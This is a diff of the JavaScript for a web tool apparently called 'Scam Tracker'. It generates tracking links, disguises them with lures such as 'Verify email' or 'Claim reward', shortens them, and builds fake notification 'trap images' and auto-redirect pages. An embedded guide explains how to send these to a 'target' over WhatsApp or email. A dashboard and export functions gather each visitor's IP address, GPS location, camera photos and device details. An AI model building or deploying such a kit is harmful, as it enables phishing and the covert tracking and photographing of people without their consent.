+    ctx.fillStyle = (style==='gradient') ? '#fff' : textColor;
+    ctx.font = `bold ${mini?8:22}px Arial`;
+    ctx.textAlign = (style==='gradient') ? 'center' : 'left';
+    const tx = (style==='gradient') ? w/2 : (mini?14:32);
+    const startY = (style==='gradient') ? h*0.48 : (mini?20:55);
+    ctx.fillText(truncate(title, mini?25:40), tx, startY);
+
+    ctx.fillStyle = (style==='gradient') ? 'rgba(255,255,255,0.9)' : color;
+    ctx.font = `bold ${mini?7:18}px Arial`;
+    ctx.fillText(truncate(sub, mini?28:45), tx, startY + (mini?11:30));
+
+    ctx.fillStyle = (style==='gradient') ? 'rgba(255,255,255,0.7)' : bodyColor;
+    ctx.font = `${mini?5:13}px Arial`;
+    ctx.fillText(truncate(body, mini?35:60), tx, startY + (mini?20:56));
+
+    ctx.fillStyle = dimColor;
+    ctx.font = `${mini?4:11}px Arial`;
+    ctx.textAlign = 'center';
+    ctx.fillText(truncate(foot, mini?40:70), w/2, h - (mini?5:16));
+
+    if (!mini) {
+        ctx.fillStyle = color;
+        roundRect(ctx, w/2 - 60, h - 50, 120, 28, 14);
+        ctx.fill();
+        ctx.fillStyle = '#fff';
+        ctx.font = 'bold 12px Arial';
+        ctx.textAlign = 'center';
+        ctx.fillText('Tap to Open →', w/2, h - 32);
+    }
+
+    ctx.strokeStyle = (style==='light') ? '#e0e0e0' : 'rgba(255,255,255,0.08)';
+    ctx.lineWidth = mini ? 1 : 2;
+    roundRect(ctx, 0, 0, w, h, mini?4:12);
+    ctx.stroke();
+}
+
+function roundRect(ctx, x, y, w, h, r) {
+    ctx.beginPath();
+    ctx.moveTo(x+r, y);
+    ctx.lineTo(x+w-r, y);
+    ctx.quadraticCurveTo(x+w, y, x+w, y+r);
+    ctx.lineTo(x+w, y+h-r);
+    ctx.quadraticCurveTo(x+w, y+h, x+w-r, y+h);
+    ctx.lineTo(x+r, y+h);
+    ctx.quadraticCurveTo(x, y+h, x, y+h-r);
+    ctx.lineTo(x, y+r);
+    ctx.quadraticCurveTo(x, y, x+r, y);
+    ctx.closePath();
+}
+
+function shiftColor(hex, amt) {
+    let r = parseInt(hex.slice(1,3),16)+amt;
+    let g = parseInt(hex.slice(3,5),16)+amt;
+    let b = parseInt(hex.slice(5,7),16)+amt;
+    r=Math.max(0,Math.min(255,r));g=Math.max(0,Math.min(255,g));b=Math.max(0,Math.min(255,b));
+    return '#'+[r,g,b].map(x=>x.toString(16).padStart(2,'0')).join('');
+}
+
+function truncate(s, max) { return s.length > max ? s.slice(0, max-2) + '…' : s; }
+
+function downloadTrapImage() {
+    if (!curOrig) { toast('⚠️ Generate a link first'); return; }
+    const canvas = document.getElementById('igCanvas');
+    const link = document.createElement('a');
+    link.download = 'notification_' + Date.now() + '.png';
+    link.href = canvas.toDataURL('image/png');
+    link.click();
+    toast('💾 Image downloaded! Send it and tell target to tap on it');
+}
+
+function copyImageHTML() {
+    if (!curOrig) { toast('⚠️ Generate a link first'); return; }
+    const canvas = document.getElementById('igCanvas');
+    const dataUrl = canvas.toDataURL('image/png');
+    const html = `<a href="${curOrig}" target="_blank"><img src="${dataUrl}" alt="Notification" style="max-width:400px;border-radius:12px;cursor:pointer"></a>`;
+    navigator.clipboard.writeText(html).then(() => toast('📋 HTML copied! Paste in email editor'));
+    document.getElementById('igCode').style.display = 'block';
+    document.getElementById('igCodeText').textContent = html;
+}
+
+function copyImageMD() {
+    if (!curOrig) { toast('⚠️ Generate a link first'); return; }
+    const md = `[![Notification](PASTE_IMAGE_URL_HERE)](${curOrig})`;
+    navigator.clipboard.writeText(md).then(() => toast('📋 Markdown copied!'));
+    document.getElementById('igCode').style.display = 'block';
+    document.getElementById('igCodeText').textContent = md;
+}
+
+function copyIGCode() {
+    const text = document.getElementById('igCodeText').textContent;
+    navigator.clipboard.writeText(text).then(() => toast('📋 Copied!'));
+}
+
+function showShareGuide() {
+    const w = window.open('', '_blank');
+    w.document.write(`<!DOCTYPE html><html><head><title>How to Send Trap Image</title>
+    <style>body{font-family:Arial,sans-serif;max-width:700px;margin:0 auto;padding:30px;line-height:1.8;color:#333}h1{color:#6c7eff}h2{margin-top:25px;color:#444}.step{background:#f5f5f5;border-radius:10px;padding:15px 20px;margin:10px 0}.code{background:#1a1a2e;color:#aaa;padding:10px;border-radius:6px;font-family:monospace;font-size:12px;word-break:break-all;margin:8px 0}.tip{background:#e8f5e9;border-left:4px solid #4caf50;padding:10px 15px;margin:10px 0;border-radius:0 8px 8px 0}</style></head><body>
+    <h1>📱 How to Send the Trap Image</h1>
+    <h2>Method 1: WhatsApp / Telegram / SMS</h2>
+    <div class="step">1. Click <b>"💾 Download Image"</b> to save the image<br>2. Open WhatsApp/Telegram<br>3. Send the image to the scammer<br>4. In the same message or next message, send the trap link<br>5. Say something like: <i>"Tap the image for details"</i></div>
+    <div class="tip">💡 On WhatsApp, the image preview will show. When they tap it and then tap the link, they open the trap page.</div>
+    <h2>Method 2: Email (HTML)</h2>
+    <div class="step">1. Click <b>"📋 Copy HTML"</b><br>2. Open Gmail → Compose<br>3. Paste the HTML code<br>4. The image will appear clickable — when they click it, trap opens</div>
+    <h2>Method 3: Upload Your Own Image</h2>
+    <div class="step">1. Use the <b>"📤 Upload Image Trap"</b> tab<br>2. Upload any image (screenshot, receipt, etc.)<br>3. Choose export format (HTML email, standalone page, etc.)<br>4. Send to target — the image becomes the trap!</div>
+    <h2>Method 4: Auto-Redirect Page</h2>
+    <div class="step">1. Upload image → choose <b>"Auto-Redirect Page"</b><br>2. Download the HTML file<br>3. Host it (GitHub Pages / Netlify) or send directly<br>4. When opened, shows image for 3 seconds then redirects to trap</div>
+    <h2>Pro Tips</h2>
+    <div class="tip">🎯 Match the image to the scam context<br>🎭 Use the link disguiser for short links<br>📱 Test on your own phone first<br>📤 Upload real screenshots for maximum believability<br>⏰ Camera and GPS require HTTPS</div>
+    </body></html>`);
+    w.document.close();
+}
+
+/* ═══ DISGUISER ═══ */
+let curOrig='',curDis='';
+const TPL=[{i:'📧',n:'Email',t:'Verify email'},{i:'🏦',n:'Payment',t:'Confirm payment'},{i:'🎁',n:'Reward',t:'Claim reward'},{i:'📦',n:'Package',t:'Track delivery'},{i:'🔐',n:'Security',t:'Secure account'},{i:'💰',n:'Transfer',t:'Approve transfer'}];
+function renderDG(){document.getElementById('dGrid').innerHTML=TPL.map((t,i)=>`<div class="lc-item" onclick="selTPL(${i})" id="tp${i}"><div class="li-icon">${t.i}</div><div class="li-name">${t.n}</div></div>`).join('')}
+function selTPL(i){document.querySelectorAll('.lc-item').forEach(e=>e.classList.remove('active'));document.getElementById('tp'+i).classList.add('active');document.getElementById('custDis').value=TPL[i].t}
+async function applyDis(){if(!curOrig){toast('⚠️ Generate link first');return}const txt=document.getElementById('custDis').value.trim();const svc=document.getElementById('disSvc').value;if(svc==='html'){curDis=`<a href="${curOrig}">${txt||'Click'}</a>`;showDis(curDis);return}if(svc==='md'){curDis=`[${txt||'Click'}](${curOrig})`;showDis(curDis);return}try{let r;if(svc==='tinyurl')r=await fetch('https://tinyurl.com/api-create.php?url='+encodeURIComponent(curOrig));else r=await fetch('https://is.gd/create.php?format=simple&url='+encodeURIComponent(curOrig));if(r.ok){curDis=await r.text();showDis(curDis)}else toast('⚠️ Failed')}catch(e){toast('⚠️ Error')}}
+function showDis(link){document.getElementById('dRow').style.display='flex';document.getElementById('gLnkD').textContent=link;document.getElementById('gLnkD').href=link.startsWith('http')?link:'#';toast('✅ Disguised!')}
+
+/* ═══ EXPORTS ═══ */
+function togExp(){document.getElementById('expMenu').classList.toggle('on')}
+document.addEventListener('click',e=>{if(!e.target.closest('.exp-drop'))document.getElementById('expMenu')?.classList.remove('on')});
+function norm(v){return{ts:v.Timestamp||v.ts||'',type:v.Type||v.type||'',ip:v.IP||v.ip||'',city:v.City||v.city||'',region:v.Region||v.region||'',country:v.Country||v.country||'',isp:v.ISP||v.org||'',lat:v.Lat||v.lat||'',lng:v.Lng||v.lng||'',acc:v.Accuracy||v.acc||'',ua:v.UserAgent||v.ua||'',platform:v.Platform||v.platform||'',lang:v.Language||v.lang||'',screen:v.Screen||v.screen||'',tz:v.Timezone||v.tz||'',cores:v.Cores||v.cores||'',mem:v.Memory||v.mem||'',gpu:v.GPU||v.gpu||'',bat:v.Battery||v.battery||'',conn:v.Connection||v.connType||'',photo:v.Photo||v.photo||'',tid:v.TrackingID||v.trackingId||''}}
+function exportHTML(){const g={};allCaptures.forEach(c=>{const t=c.TrackingID||c.trackingId||'?';if(!g[t])g[t]=[];g[t].push(c)});Object.keys(allLinks).forEach(t=>{if(!g[t])g[t]=[]});const w=window.open('','_blank');w.document.write(buildReport(g));w.document.close();toast('📄 Report opened')}
+function buildReport(groups){const ids=Object.keys(groups);let h=`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Report</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;padding:30px;max-width:900px;margin:0 auto}h1{text-align:center;margin-bottom:20px}.case{border:2px solid #ddd;border-radius:12px;margin-bottom:20px;overflow:hidden}.case-h{background:#f5f5f5;padding:12px 18px;border-bottom:2px solid #ddd}.visit{padding:15px;border-bottom:1px solid #eee;display:grid;grid-template-columns:140px 1fr;gap:15px}.visit img{width:140px;height:105px;object-fit:cover;border-radius:8px}.info{font-size:13px;line-height:1.8}.info b{min-width:80px;display:inline-block}.print-btn{position:fixed;top:15px;right:15px;background:#6c7eff;color:#fff;border:none;padding:10px 24px;border-radius:8px;cursor:pointer;font-size:14px}@media print{.print-btn{display:none}}</style></head><body><button class="print-btn" onclick="window.print()">🖨️ Print / PDF</button><h1>🔒 Scam Tracker Report</h1><p style="text-align:center;color:#888;margin-bottom:25px">${new Date().toLocaleString()} • ${ids.length} case(s)</p>`;
+    ids.forEach(tid=>{const li=allLinks[tid]||{label:tid};const visits=groups[tid];h+=`<div class="case"><div class="case-h"><b>${esc(li.label||tid)}</b> • ${tid} • ${visits.length} visit(s)</div>`;visits.forEach(v=>{const n=norm(v);const hl=n.lat&&n.lng&&n.lat!=='';h+=`<div class="visit"><div>${n.photo?`<img src="${n.photo}">`:'<div style="width:140px;height:105px;background:#f0f0f0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#aaa">No Photo</div>'}</div><div class="info"><b>⏰ Time:</b> ${n.ts?new Date(n.ts).toLocaleString():'?'}<br><b>🌐 IP:</b> ${n.ip||'?'}<br><b>📍 GPS:</b> ${hl?`${Number(n.lat).toFixed(6)}, ${Number(n.lng).toFixed(6)} <a href="https://www.google.com/maps?q=${n.lat},${n.lng}" target="_blank">Map↗</a>`:'N/A'}<br><b>🗺️ Area:</b> ${[n.city,n.region,n.country].filter(Boolean).join(', ')||'N/A'}<br><b>🏢 ISP:</b> ${n.isp||'N/A'}<br><b>💻 Dev:</b> ${n.platform||'?'} • ${n.screen}<br><b>🌍 Zone:</b> ${n.tz} • ${n.lang}<br>${n.gpu?`<b>🎮 GPU:</b> ${esc(n.gpu)}<br>`:''}${n.bat?`<b>🔋 Batt:</b> ${n.bat}<br>`:''}<b>🔍 UA:</b> <span style="font-size:10px;color:#888">${esc(n.ua)}</span></div></div>`});h+=`</div>`});
+    h+=`</body></html>`;return h}
+function exportCSV(){const hd=['TrackingID','Type','Timestamp','IP','City','Region','Country','ISP','Lat','Lng','Platform','Timezone','UserAgent'];let csv=hd.join(',')+'\n';allCaptures.forEach(v=>{const n=norm(v);csv+=[n.tid,n.type,n.ts,n.ip,n.city,n.region,n.country,n.isp,n.lat,n.lng,n.platform,n.tz,`"${(n.ua||'').replace(/"/g,"'")}"`].join(',')+'\n'});dl(csv,'text/csv','scamtracker.csv');toast('📊 CSV downloaded')}
+function exportJSON(){dl(JSON.stringify({links:allLinks,captures:allCaptures},null,2),'application/json','scamtracker.json');toast('🔧 JSON downloaded')}
+function saveAllPhotos(){const ph=[];allCaptures.forEach(v=>{const n=norm(v);if(n.photo)ph.push(n)});if(!ph.length){toast('⚠️ No photos');return}const w=window.open('','_blank');w.document.write(`<!DOCTYPE html><html><head><title>Photos</title><style>body{background:#111;color:#fff;font-family:Arial;padding:20px;text-align:center}.g{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;max-width:1000px;margin:0 auto}.c{background:#1a1a1a;border-radius:10px;overflow:hidden}.c img{width:100%;height:160px;object-fit:cover}.c p{padding:8px;font-size:11px;color:#aaa}button{margin:3px;padding:4px 10px;background:#6c7eff;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:11px}</style></head><body><h2>📸 Photos (${ph.length})</h2><p style="color:#666;margin-bottom:15px">Right-click → Save, or click button</p><div class="g">${ph.map((p,i)=>`<div class="c"><img src="${p.photo}" id="p${i}"><p>${p.tid}<br>${p.ip}<br><button onclick="const a=document.createElement('a');a.href=document.getElementById('p${i}').src;a.download='photo_${i}.jpg';a.click()">💾 Save</button></p></div>`).join('')}</div></body></html>`);w.document.close();toast('🖼️ Photos opened')}
+function dl(c,t,f){const b=new Blob([c],{type:t});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=f;a.click();URL.revokeObjectURL(a.href)}
+
+/* ═══ DASHBOARD ═══ */
+let allCaptures=[],allLinks={},mC=0;
+async function refreshAll(){try{const[c,l]=await Promise.all([api({action:'get_all'}),api({action:'get_links'})]);allCaptures=c.captures||[];allLinks={};(l.links||[]).forEach(x=>{allLinks[x.trackingId]=x});renderDash()}catch(e){console.error(e)}}
+function renderDash(){Object.keys(aM).forEach(k=>{if(k!=='fmC'){aM[k].remove();delete aM[k]}});const g={};allCaptures.forEach(c=>{const t=c.TrackingID||c.trackingId||'?';if(!g[t])g[t]=[];g[t].push(c)});Object.keys(allLinks).forEach(t=>{if(!g[t])g[t]=[]});const ids=Object.keys(g);let tv=0,tp=0,tl=0;ids.forEach(id=>{g[id].forEach(v=>{tv++;if(v.Photo||v.photo)tp++;if((v.Lat||v.lat)&&(v.Type||v.type)!=='pageload')tl++})});document.getElementById('s1').textContent=ids.length;document.getElementById('s2').textContent=tv;document.getElementById('s3').textContent=tp;document.getElementById('s4').textContent=tl;const el=document.getElementById('capList');if(!ids.length){el.innerHTML='<div class="empty"><div class="ei">📡</div><h3>No data</h3></div>';return}const sorted=ids.sort((a,b)=>{const aT=g[a].length?Math.max(...g[a].map(v=>new Date(v.Timestamp||v.ts||0).getTime())):0;const bT=g[b].length?Math.max(...g[b].map(v=>new Date(v.Timestamp||v.ts||0).getTime())):0;return bT-aT});el.innerHTML=sorted.map(id=>{const li=allLinks[id]||{label:id,created:''};const vs=g[id].sort((a,b)=>new Date(b.Timestamp||b.ts||0)-new Date(a.Timestamp||a.ts||0));return`<div class="cc"><div class="ch"><div><span class="cl">${esc(li.label||id)}</span> <span class="ci">${id}</span> <span class="vc">${vs.length}</span></div><div style="display:flex;gap:5px;align-items:center"><span class="cd">${li.created?new Date(li.created).toLocaleString():''}</span><button class="b b-no" onclick="delCap('${id}')" style="padding:2px 7px;font-size:10px">🗑️</button></div></div><div class="vw">${vs.length===0?'<p style="color:#262638;text-align:center;padding:16px">Waiting...</p>':vs.map(v=>rvst(v)).join('')}</div></div>`}).join('')}
+
+function rvst(v){const n=norm(v);const hp=!!n.photo,hl=!!(n.lat&&n.lng&&n.lat!=='');let bg='';if(hp)bg+='<span class="bg bg-p">📸</span>';if(hl)bg+='<span class="bg bg-l">📍</span>';if(n.type==='pageload')bg+='<span class="bg bg-b">👁️</span>';if(n.type==='full_capture')bg+='<span class="bg bg-p">🔓</span>';const locTxt=hl?`${Number(n.lat).toFixed(6)}, ${Number(n.lng).toFixed(6)}`:(n.city?`≈${n.city}, ${n.country}`:'N/A');let ex='';if(n.bat)ex+=`<div class="vi"><span class="vl">🔋</span><span class="vv">${n.bat}</span></div>`;if(n.isp)ex+=`<div class="vi"><span class="vl">🏢</span><span class="vv">${esc(n.isp)}</span></div>`;const mid='m'+(mC++);let mapS='';if(hl){const la=Number(n.lat),lo=Number(n.lng),ac=Number(n.acc||0),inf=[n.city,n.region,n.country].filter(Boolean).join(', ');mapS=`<div class="map-wrapper"><div class="map-toggle" onclick="togMap('${mid}',${la},${lo},${ac},\`${n.photo||'null'}\`,\`${esc(inf)}\`)">📌 Map</div><div id="${mid}_w" style="display:none"><div class="map-toolbar">${Object.entries(TILES).map(([k,v],i)=>`<button class="${i===2?'active':''}" onclick="sInl('${mid}','${k}',this)">${v.n}</button>`).join('')}</div><div class="map-container" id="${mid}"><div class="map-coords">${la.toFixed(6)}, ${lo.toFixed(6)}</div><button class="map-fullscreen" onclick="openFM(${la},${lo},${ac},\`${n.photo||'null'}\`,\`${esc(inf)}\`)">⛶</button></div></div></div>`}return`<div class="vr-card"><div class="vr-top"><div class="vp">${hp?`<img src="${n.photo}" onclick="showPh(this.src)">`:'📷'}</div><div class="vd"><div style="margin-bottom:2px">${bg}</div><div class="vi"><span class="vl">⏰</span><span class="vv">${n.ts?new Date(n.ts).toLocaleString():'?'}</span></div><div class="vi"><span class="vl">🌐</span><span class="vv">${n.ip||'?'}</span></div><div class="vi"><span class="vl">📍</span><span class="vv">${locTxt}</span></div><div class="vi"><span class="vl">🗺️</span><span class="vv">${[n.city,n.region,n.country].filter(Boolean).join(', ')||'N/A'}</span></div><div class="vi"><span class="vl">💻</span><span class="vv">${esc(n.platform||'?')} • ${n.screen}</span></div><div class="vi"><span class="vl">🌍</span><span class="vv">${n.tz||'?'}</span></div>${ex}<div class="vi"><span class="vl">🔍</span><span class="vv" style="font-size:9px;color:#333">${esc(n.ua||'?')}</span></div></div></div>${mapS}<div class="vr-actions">${hp?`<button onclick="savePh('${n.photo.substring(0,30)}...')">💾 Photo</button>`:''}</div></div>`}
+
+function savePh(d){}
+function showPh(src){document.getElementById('mImg').src=src;document.getElementById('pMod').classList.add('on')}
+
+async function genLink(){const label=document.getElementById('lnkLbl').value.trim()||'Unnamed';const id=gid();const base=location.href.split('?')[0];const link=base+'?t='+id;try{await api({action:'save_link',trackingId:id,label,created:new Date().toISOString()})}catch(e){}curOrig=link;curDis='';document.getElementById('gLnk').href=link;document.getElementById('gLnk').textContent=link;document.getElementById('dRow').style.display='none';document.getElementById('lBan').style.display='flex';
+
+// Show tool tabs
+document.getElementById('toolTabs').style.display='flex';
+
+// Show first tool by default
+document.getElementById('linkCust').style.display='block';
+document.getElementById('imgGen').style.display='none';
+document.getElementById('imgUpload').style.display='none';
+
+// Reset tabs
+document.querySelectorAll('.tool-tab').forEach((t,i)=>{t.classList.toggle('active',i===0)});
+
+document.getElementById('lnkLbl').value='';renderDG();renderTemplates();renderPreview();toast('✅ Link generated! Use the tools below to disguise, generate images, or upload your own')}
+
+function copyL(t){const v=t==='dis'?curDis:curOrig;if(!v){toast('⚠️ Nothing');return}navigator.clipboard.writeText(v).then(()=>toast('📋 Copied!'))}
+async function delCap(id){if(!confirm('Delete?'))return;try{await Promise.all([api({action:'delete',trackingId:id}),api({action:'delete_link',trackingId:id})]);toast('🗑️ Deleted');refreshAll()}catch(e){toast('❌ Failed')}}
+async function clearAllData(){if(!confirm('DELETE ALL?'))return;if(!confirm('Sure?'))return;try{await api({action:'delete_all'});toast('🗑️ Cleared');refreshAll()}catch(e){toast('❌ Failed')}}
+
+function gid(){return Math.random().toString(36).substr(2,8)}
+function esc(s){if(!s)return'';const d=document.createElement('div');d.textContent=String(s);return d.innerHTML}
+function toast(m){const t=document.getElementById('toast');t.textContent=m;t.classList.add('on');clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('on'),4000)}
+init();
+</script>
+</body>
+</html>
